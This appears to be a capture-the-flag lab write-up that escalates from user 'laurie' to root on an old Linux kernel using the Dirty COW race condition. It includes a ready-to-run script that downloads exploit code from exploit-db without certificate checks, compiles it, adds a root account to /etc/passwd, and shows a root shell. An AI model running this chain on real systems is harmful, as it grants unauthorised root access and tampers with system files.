We are going to try to do an escalation so let's grab infos about the kernel version

laurie@BornToSecHackMe:/tmp$ uname -r
3.2.0-91-generic-pae

We are going to look for potential valid escalation for this version. Let's use a very well known site called exploit-db.

Here we are going to use a very well known exploit called Dirty COW (Copy on Write) that works of Linux Kernel 2.6.22 < 3.9.
This exploit will add a line in the file /etc/passwd even if we don't have write privileges.
To do so it will use multiple thread, the function madvise(map, 100, MADV_DONTNEED) and mmap.
The macro MADV_DONTNEED is very important for this exploit.
This exploit is a race condition. To explain quickly, here we write on a virtual copy on the file /etc/passwd which is loaded in memory.
The fact that there is the key word MDV_DONTNEED specify that it can free this copy of the memory because we are supposed to not need it.
With the good timing of the race condition, we will not overwrite the virtual copy but the real file.

Let's use the following script which :
- download the piece of code from exploit-db.com
- rename the file
- modify the name of the user we want to create. Here we rename it exploit
- Then executes it with the parameter which will be the password assigned to this new user. Here exploit too.

# Local escalation with CVE 2016-5195 (Race condition with /etc/passwd)

grn=$'\e[1;32m'
end=$'\e[0m'

wget --no-check-certificate https://www.exploit-db.com/download/40839
mv 40839 40839.c
sed -i 's/firefart/exploit/g' 40839.c
gcc -pthread 40839.c -o exploit-40839-cve-2016-5195 -lcrypt
sh -c './exploit-40839-cve-2016-5195 exploit' &
printf "${grn}Type: \"su - exploit\"${end}\n${grn}Password: exploit${end}\n${grn} Type \"echo 0 > /proc/sys/vm/dirty_writeback_centisecs\" to limit undefined behaviour once logged.${end}"

Let's log with the user laurie. laurie doesn't have root privilege. We are going to do a local privilege escalation.
Let's run the script :

laurie@BornToSecHackMe:/tmp$ sh dirty.sh
--2020-03-25 14:01:45--  https://www.exploit-db.com/download/40839
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
WARNING: no certificate subject alternative name matches
	requested host name `www.exploit-db.com'.
HTTP request sent, awaiting response... 200 OK
Length: 5006 (4.9K) [application/txt]
Saving to: `40839'

100%[============================================================================>] 5,006       --.-K/s   in 0s

2020-03-25 14:01:45 (1.15 GB/s) - `40839' saved [5006/5006]

$\e[1;32mType: "su - exploit"$\e[0m
$\e[1;32mPassword: exploit$\e[0m
$\e[1;32m Type "echo 0 > /proc/sys/vm/dirty_writeback_centisecs" to limit undefined behaviour once logged.$\e[0mlaurie
laurie@BornToSecHackMe:/tmp$ /etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: exploit
Complete line:
exploit:exVSdKqGwAJYQ:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'exploit' and the password 'exploit'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd

laurie@BornToSecHackMe:/tmp$ su
Password: exploit
exploit@BornToSecHackMe:/tmp# whoami
exploit
exploit@BornToSecHackMe:/tmp# id
uid=0(exploit) gid=0(root) groups=0(root)

We are root !


